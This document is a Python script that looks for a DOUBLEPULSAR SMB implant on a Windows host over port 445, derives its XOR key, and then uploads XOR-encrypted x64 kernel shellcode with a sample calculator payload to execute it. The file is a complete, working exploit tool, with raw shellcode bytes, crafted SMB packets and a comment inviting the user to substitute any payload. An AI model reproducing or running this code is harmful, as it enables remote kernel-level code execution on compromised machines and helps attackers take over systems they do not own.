#!/usr/bin/python

import binascii
import socket
import struct

def hexdump(src, length=16, sep='.'):
    """Hex dump bytes to ASCII string, padded neatly
    In [107]: x = b'\x01\x02\x03\x04AAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB'
    In [108]: print('\n'.join(hexdump(x)))
    00000000  01 02 03 04 41 41 41 41  41 41 41 41 41 41 41 41 |....AAAAAAAAAAAA|
    00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 42 42 |AAAAAAAAAAAAAABB|
    00000020  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42 |BBBBBBBBBBBBBBBB|
    00000030  42 42 42 42 42 42 42 42                          |BBBBBBBB        |
    """
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])
    lines = []
    for c in range(0, len(src), length):
        chars = src[c: c + length]
        hex_ = ' '.join(['{:02x}'.format(x) for x in chars])
        if len(hex_) > 24:
            hex_ = '{} {}'.format(hex_[:24], hex_[24:])
        printable = ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
        lines.append('{0:08x}  {1:{2}s} |{3:{4}s}|'.format(c, hex_, length * 3, printable, length))
    return lines

kernel_shellcode = b"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
kernel_shellcode += b"\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
kernel_shellcode += b"\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8\x65\x48\x89\x24\x25\x10"
kernel_shellcode += b"\x00\x00\x00\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x50\x53\x51\x52"
kernel_shellcode += b"\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41"
kernel_shellcode += b"\x56\x41\x57\x6A\x2B\x65\xFF\x34\x25\x10\x00\x00\x00\x41\x53\x6A"
kernel_shellcode += b"\x33\x51\x4C\x89\xD1\x48\x83\xEC\x08\x55\x48\x81\xEC\x58\x01\x00"
kernel_shellcode += b"\x00\x48\x8D\xAC\x24\x80\x00\x00\x00\x48\x89\x9D\xC0\x00\x00\x00"
kernel_shellcode += b"\x48\x89\xBD\xC8\x00\x00\x00\x48\x89\xB5\xD0\x00\x00\x00\x48\xA1"
kernel_shellcode += b"\xF8\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x48\x89\xC2\x48\xC1\xEA\x20\x48"
kernel_shellcode += b"\x31\xDB\xFF\xCB\x48\x21\xD8\xB9\x82\x00\x00\xC0\x0F\x30\xFB\xE8"
kernel_shellcode += b"\x38\x00\x00\x00\xFA\x65\x48\x8B\x24\x25\xA8\x01\x00\x00\x48\x83"
kernel_shellcode += b"\xEC\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59"
kernel_shellcode += b"\x41\x58\x5D\x5F\x5E\x5A\x59\x5B\x58\x65\x48\x8B\x24\x25\x10\x00"
kernel_shellcode += b"\x00\x00\x0F\x01\xF8\xFF\x24\x25\xF8\x0F\xD0\xFF\x56\x41\x57\x41"
kernel_shellcode += b"\x56\x41\x55\x41\x54\x53\x55\x48\x89\xE5\x66\x83\xE4\xF0\x48\x83"
kernel_shellcode += b"\xEC\x20\x4C\x8D\x35\xE3\xFF\xFF\xFF\x65\x4C\x8B\x3C\x25\x38\x00"
kernel_shellcode += b"\x00\x00\x4D\x8B\x7F\x04\x49\xC1\xEF\x0C\x49\xC1\xE7\x0C\x49\x81"
kernel_shellcode += b"\xEF\x00\x10\x00\x00\x49\x8B\x37\x66\x81\xFE\x4D\x5A\x75\xEF\x41"
kernel_shellcode += b"\xBB\x5C\x72\x11\x62\xE8\x18\x02\x00\x00\x48\x89\xC6\x48\x81\xC6"
kernel_shellcode += b"\x08\x03\x00\x00\x41\xBB\x7A\xBA\xA3\x30\xE8\x03\x02\x00\x00\x48"
kernel_shellcode += b"\x89\xF1\x48\x39\xF0\x77\x11\x48\x8D\x90\x00\x05\x00\x00\x48\x39"
kernel_shellcode += b"\xF2\x72\x05\x48\x29\xC6\xEB\x08\x48\x8B\x36\x48\x39\xCE\x75\xE2"
kernel_shellcode += b"\x49\x89\xF4\x31\xDB\x89\xD9\x83\xC1\x04\x81\xF9\x00\x00\x01\x00"
kernel_shellcode += b"\x0F\x8D\x66\x01\x00\x00\x4C\x89\xF2\x89\xCB\x41\xBB\x66\x55\xA2"
kernel_shellcode += b"\x4B\xE8\xBC\x01\x00\x00\x85\xC0\x75\xDB\x49\x8B\x0E\x41\xBB\xA3"
kernel_shellcode += b"\x6F\x72\x2D\xE8\xAA\x01\x00\x00\x48\x89\xC6\xE8\x50\x01\x00\x00"
kernel_shellcode += b"\x41\x81\xF9\xBF\x77\x1F\xDD\x75\xBC\x49\x8B\x1E\x4D\x8D\x6E\x10"
kernel_shellcode += b"\x4C\x89\xEA\x48\x89\xD9\x41\xBB\xE5\x24\x11\xDC\xE8\x81\x01\x00"
kernel_shellcode += b"\x00\x6A\x40\x68\x00\x10\x00\x00\x4D\x8D\x4E\x08\x49\xC7\x01\x00"
kernel_shellcode += b"\x10\x00\x00\x4D\x31\xC0\x4C\x89\xF2\x31\xC9\x48\x89\x0A\x48\xF7"
kernel_shellcode += b"\xD1\x41\xBB\x4B\xCA\x0A\xEE\x48\x83\xEC\x20\xE8\x52\x01\x00\x00"
kernel_shellcode += b"\x85\xC0\x0F\x85\xC8\x00\x00\x00\x49\x8B\x3E\x48\x8D\x35\xE9\x00"
kernel_shellcode += b"\x00\x00\x31\xC9\x66\x03\x0D\xD7\x01\x00\x00\x66\x81\xC1\xF9\x00"
kernel_shellcode += b"\xF3\xA4\x48\x89\xDE\x48\x81\xC6\x08\x03\x00\x00\x48\x89\xF1\x48"
kernel_shellcode += b"\x8B\x11\x4C\x29\xE2\x51\x52\x48\x89\xD1\x48\x83\xEC\x20\x41\xBB"
kernel_shellcode += b"\x26\x40\x36\x9D\xE8\x09\x01\x00\x00\x48\x83\xC4\x20\x5A\x59\x48"
kernel_shellcode += b"\x85\xC0\x74\x18\x48\x8B\x80\xC8\x02\x00\x00\x48\x85\xC0\x74\x0C"
kernel_shellcode += b"\x48\x83\xC2\x4C\x8B\x02\x0F\xBA\xE0\x05\x72\x05\x48\x8B\x09\xEB"
kernel_shellcode += b"\xBE\x48\x83\xEA\x4C\x49\x89\xD4\x31\xD2\x80\xC2\x90\x31\xC9\x41"
kernel_shellcode += b"\xBB\x26\xAC\x50\x91\xE8\xC8\x00\x00\x00\x48\x89\xC1\x4C\x8D\x89"
kernel_shellcode += b"\x80\x00\x00\x00\x41\xC6\x01\xC3\x4C\x89\xE2\x49\x89\xC4\x4D\x31"
kernel_shellcode += b"\xC0\x41\x50\x6A\x01\x49\x8B\x06\x50\x41\x50\x48\x83\xEC\x20\x41"
kernel_shellcode += b"\xBB\xAC\xCE\x55\x4B\xE8\x98\x00\x00\x00\x31\xD2\x52\x52\x41\x58"
kernel_shellcode += b"\x41\x59\x4C\x89\xE1\x41\xBB\x18\x38\x09\x9E\xE8\x82\x00\x00\x00"
kernel_shellcode += b"\x4C\x89\xE9\x41\xBB\x22\xB7\xB3\x7D\xE8\x74\x00\x00\x00\x48\x89"
kernel_shellcode += b"\xD9\x41\xBB\x0D\xE2\x4D\x85\xE8\x66\x00\x00\x00\x48\x89\xEC\x5D"
kernel_shellcode += b"\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5E\xC3\xE9\xB5\x00\x00\x00"
kernel_shellcode += b"\x4D\x31\xC9\x31\xC0\xAC\x41\xC1\xC9\x0D\x3C\x61\x7C\x02\x2C\x20"
kernel_shellcode += b"\x41\x01\xC1\x38\xE0\x75\xEC\xC3\x31\xD2\x65\x48\x8B\x52\x60\x48"
kernel_shellcode += b"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x12\x48\x8B\x72\x50\x48\x0F"
kernel_shellcode += b"\xB7\x4A\x4A\x45\x31\xC9\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41"
kernel_shellcode += b"\xC1\xC9\x0D\x41\x01\xC1\xE2\xEE\x45\x39\xD9\x75\xDA\x4C\x8B\x7A"
kernel_shellcode += b"\x20\xC3\x4C\x89\xF8\x41\x51\x41\x50\x52\x51\x56\x48\x89\xC2\x8B"
kernel_shellcode += b"\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x01\xD0\x50\x8B"
kernel_shellcode += b"\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\x48\xFF\xC9\x41\x8B\x34\x88"
kernel_shellcode += b"\x48\x01\xD6\xE8\x78\xFF\xFF\xFF\x45\x39\xD9\x75\xEC\x58\x44\x8B"
kernel_shellcode += b"\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01"
kernel_shellcode += b"\xD0\x41\x8B\x04\x88\x48\x01\xD0\x5E\x59\x5A\x41\x58\x41\x59\x41"
kernel_shellcode += b"\x5B\x41\x53\xFF\xE0\x56\x41\x57\x55\x48\x89\xE5\x48\x83\xEC\x20"
kernel_shellcode += b"\x41\xBB\xDA\x16\xAF\x92\xE8\x4D\xFF\xFF\xFF\x31\xC9\x51\x51\x51"
kernel_shellcode += b"\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00\x5A\x48\x83\xEC\x20\x41"
kernel_shellcode += b"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
kernel_shellcode += b"\x5E\xC3"

# pop calculator shellcode - this is a sample.  Change according to your payload
payload_shellcode = b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
payload_shellcode += b"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
payload_shellcode += b"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
payload_shellcode += b"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
payload_shellcode += b"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
payload_shellcode += b"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
payload_shellcode += b"\x48\x83\xec\x20\x41\xff\xd6"

def calculate_doublepulsar_xor_key(s):
    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    return x

# The arch is adjacent to the XOR key in the SMB signature
def calculate_doublepulsar_arch(s):
    if s & 0xffffffff00000000 == 0:
        return "x86 (32-bit)"
    else:
        return "x64 (64-bit)"

def byte_xor(data, key):
    key_bytes = key.to_bytes(4, byteorder='little')
    key_length = len(key_bytes)
    '''
    for i in range(len(data)):
        data[i] ^= key_bytes[i % key_length]
    return data
    '''
    return bytearray(data[i] ^ key_bytes[i % key_length] for i in range(len(data)))

#https://github.com/bjornedstrom/elliptic-curve-chemistry-set/blob/master/eddsa.py
def le2int(buf):
    """little endian buffer to integer."""
    integer = 0
    shift = 0
    for byte in buf:
        integer |= ord(byte) << shift
        shift += 8
    return integer

def int2le(integer, pad):
    """integer to little endian buffer."""
    buf = []
    while integer:
        buf.append(chr(integer & 0xff))
        integer >>= 8
        pad -= 1
    while pad > 0:
        buf.append('\x00')
        pad -= 1
    if not buf:
        return '\x00'
    return ''.join(buf)

#converted with chatgpt
def int_to_le(data: int) -> bytes:
    b = bytearray(4)
    b[0] = data & 0xFF
    b[1] = (data >> 8) & 0xFF
    b[2] = (data >> 16) & 0xFF
    b[3] = (data >> 24) & 0xFF
    return bytes(b)
'''
# Test the function
data = 0x12345678
result = int_to_le(data)
print(result)  # Output: b'xV4\x12'
print("Bytes: ", " ".join(f"{byte:02X}" for byte in result))
'''

if __name__ == "__main__":

    # Packets
    negotiate_protocol_request = binascii.unhexlify("00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
    session_setup_request = binascii.unhexlify("00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
    tree_connect_request = binascii.unhexlify("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
    trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")

    timeout = 5.0
    # sample IP
    ip = "192.168.0.8"

    # Connect to socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(float(timeout) if timeout else None)
    host = ip
    port = 445
    s.connect((host, port))

    # Send/receive negotiate protocol request
    print("Sending negotiation protocol request")
    s.send(negotiate_protocol_request)
    s.recv(1024)

    # Send/receive session setup request
    print("Sending session setup request")
    s.send(session_setup_request)
    session_setup_response = s.recv(1024)

    # Extract user ID from session setup response
    user_id = session_setup_response[32:34]
    print("User ID = %s" % struct.unpack("<H", user_id)[0])

    # Replace user ID in tree connect request packet
    modified_tree_connect_request = bytearray(tree_connect_request)
    modified_tree_connect_request[32] = user_id[0]
    modified_tree_connect_request[33] = user_id[1]

    # Send tree connect request
    print("Sending tree connect")
    s.send(modified_tree_connect_request)
    tree_connect_response = s.recv(1024)

    # Extract tree ID from response
    tree_id = tree_connect_response[28:30]
    print("Tree ID = %s" % struct.unpack("<H", tree_id)[0])

    # Replace tree ID and user ID in trans2 session setup packet
    modified_trans2_session_setup = bytearray(trans2_session_setup)
    modified_trans2_session_setup[28] = tree_id[0]
    modified_trans2_session_setup[29] = tree_id[1]
    modified_trans2_session_setup[32] = user_id[0]
    modified_trans2_session_setup[33] = user_id[1]

    # Send trans2 sessions setup request
    print("Sending trans2 session setup - ping command")
    s.send(modified_trans2_session_setup)
    final_response = s.recv(1024)

    # Check for 0x51 response to indicate DOUBLEPULSAR infection
    if final_response[34] == 81:
        signature = final_response[18:22]
        signature_long = struct.unpack('<I', signature)[0]
        key = calculate_doublepulsar_xor_key(signature_long)
        
        #arch_signature = final_response[18:26]
        #arch_signature_long = struct.unpack('<Q', arch_signature)[0]
        #arch = calculate_doublepulsar_arch(arch_signature_long)
        
        arch_signature = final_response[22:26]
        arch_signature_long = struct.unpack('<I', arch_signature)[0]
        arch = calculate_doublepulsar_arch(arch_signature_long)
        
        print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
        
        xor_key = key
        packed_xor_key = struct.pack('<I', xor_key)

        #print(hexdump(packed_xor_key))
        #int_bytes_xor_key = int(key)
        #bytes_xor_key = int2le(int_bytes_xor_key, 0)
        #b_bytes_xor_key = bytes(bytes_xor_key.encode())
        #print(hexdump(b_bytes_xor_key))
        #print(hexdump(packed_xor_key))
        #print(packed_xor_key)

        #generate the final payload shellcode first
        modified_kernel_shellcode = bytearray(kernel_shellcode)
        bytes_payload_shellcode = bytearray(payload_shellcode)

        # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
        payload_shellcode_size = len(payload_shellcode)

        payload_shellcode_size_in_hex = struct.pack('<H', payload_shellcode_size)
        modified_kernel_shellcode += payload_shellcode_size_in_hex
        modified_kernel_shellcode += bytes_payload_shellcode
        
        shellcode_payload_size = len(modified_kernel_shellcode)
        print("Total size of shellcode:  %d" % shellcode_payload_size)

        #padding to 4096 bytes confirmed to work
        #you must pad the buffer to 4096 bytes
        print("Total size of shellcode before padding:  %d" % shellcode_payload_size)
        padded_bytes = 4096 - shellcode_payload_size
        max_shellcode_size = 4096

        bytes_filler_bytes = bytearray()
        bytes_filler_bytes += b'\x90' * padded_bytes
        modified_kernel_shellcode += bytes_filler_bytes
        buffer_len = len(modified_kernel_shellcode)
        print("Total size of shellcode after padding:  %d" % buffer_len)

        
        #xor the payload data now
        print("encrypting the shellcode with the XOR key")
        xor_data = byte_xor(modified_kernel_shellcode, key)
        
        #build the doublepulsar parameters
        EntireShellcodeSize = len(modified_kernel_shellcode)
        print("Generating the parameters...")
        parameters = b''
        '''
        since our payload is less than 4096, we can send the packet in one packet.
        it is possible for the EntireSize to be 5 MB in bytes
        it is not possible for the chunksize to be more than 4096
        if this is a large payload, you must increment the offset by the last chunk size
        '''
        EntireSize = struct.pack('<I', max_shellcode_size) #entire value of the payload being uploaded
        ChunkSize = struct.pack('<I', max_shellcode_size) #using the same value since chunk size is less than 4096 
        PayloadOffset = struct.pack('<I', 0) #No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
        parameters += EntireSize
        parameters += ChunkSize
        parameters += PayloadOffset
        parameters_bytearray = bytearray(parameters)
        xor_parameters = byte_xor(parameters_bytearray, key)
        
        #build the execution packet
        trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
        doublepulsar_exec_packet = bytearray(trans2_exec_packet)
        
        trans2_packet_len = len(doublepulsar_exec_packet)
        print("Total size of SMB packet:  %d" % trans2_packet_len)
        
        packet_len = trans2_packet_len + shellcode_payload_size
        print("Total size of SMB packet & shellcode:  %d" % packet_len)
        
        print("we take out 4 from the total size because the NetBIOS length is not counted in the SMB Packet")
        print("Example: A full packet wil be 4178 bytes in length.  4096 bytes for shellcode, 70 for the SMB doublepulsar packet, 12 for the parameters")
        print("but the NetBIOS header will say 4174 because the 4 bytes in the NetBIOS header doesn't count")

        '''
        merged packet len = trans2 packet len ( 70 & contains NetBIOS Header )
                           + merged shellcode length size
                           + parameter len ( 12 )
                           - NetBIOS header (4 )
        '''
        merged_packet_len = trans2_packet_len + shellcode_payload_size + 12 - 4
        print("UPDATED:  Total size of SMB packet & shellcode:  %d" % merged_packet_len)

        print("Updating SMB length value...")
        #SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
        smb_length = struct.pack('>H', merged_packet_len)
        doublepulsar_exec_packet[2] = smb_length[0]
        doublepulsar_exec_packet[3] = smb_length[1]
        
        #<H = Little Endian unsigned short
        TotalDataCount = struct.pack('<H', shellcode_payload_size)
        DataCount = struct.pack('<H', shellcode_payload_size)
        ByteCount = struct.pack('<H', shellcode_payload_size+12)
        
        '''
        not sure why we add 13 here
        and not 12 but it's because of the parameters but it's in the Doublepulsar 
        examples so we'll just copy that for now
        '''
        
        #update TotalDataCount in the packet ( default in the packet is 4096 )
        doublepulsar_exec_packet[39] = TotalDataCount[0]
        doublepulsar_exec_packet[40] = TotalDataCount[1]
        #update DataCount in the packet ( default in the packet is 4096 )
        doublepulsar_exec_packet[59] = DataCount[0]
        doublepulsar_exec_packet[60] = DataCount[1]
        #update ByteCount in the packet ( default in the packet is 4109 )
        doublepulsar_exec_packet[67] = ByteCount[0]
        doublepulsar_exec_packet[68] = ByteCount[1]
    
        #update values for tree ID and user ID
        doublepulsar_exec_packet[28] = tree_id[0]
        doublepulsar_exec_packet[29] = tree_id[1]
        doublepulsar_exec_packet[32] = user_id[0]
        doublepulsar_exec_packet[33] = user_id[1]

        doublepulsar_exec_packet += xor_parameters
        doublepulsar_exec_packet += xor_data

        #print("hex content of the hex packet")
        #print(hexdump(doublepulsar_exec_packet))
        print("Sending data!  Length of the final hex packet", len(doublepulsar_exec_packet))
        s.send(doublepulsar_exec_packet)
        smb_response = s.recv(1024)

        #0x52
        if smb_response[34] == 82:
	        print("Doublepulsar returned:  Success!\n")
        #0x62
        elif smb_response[34] == 98:
	        print("Doublepulsar returned:  Invalid parameters!\n")
        #0x72
        elif smb_response[34] == 114:
	        print("Doublepulsar returned:  Allocation failure!\n")
        else:
	        print("Doublepulsar didn't succeed\n")
         
        tree_disconnect = binascii.unhexlify("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000")
        tree_disconnect_packet = bytearray(tree_disconnect)
        tree_disconnect_packet[28] = tree_id[0]
        tree_disconnect_packet[29] = tree_id[1]
        tree_disconnect_packet[32] = user_id[0]
        tree_disconnect_packet[33] = user_id[1]
        s.send(tree_disconnect_packet)
        smb_response = s.recv(1024)

        logoff = binascii.unhexlify("00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000")
        logoff_packet = bytearray(logoff)
        logoff_packet[28] = tree_id[0]
        logoff_packet[29] = tree_id[1]
        logoff_packet[32] = user_id[0]
        logoff_packet[33] = user_id[1]
        s.send(logoff_packet)
        smb_response = s.recv(1024)
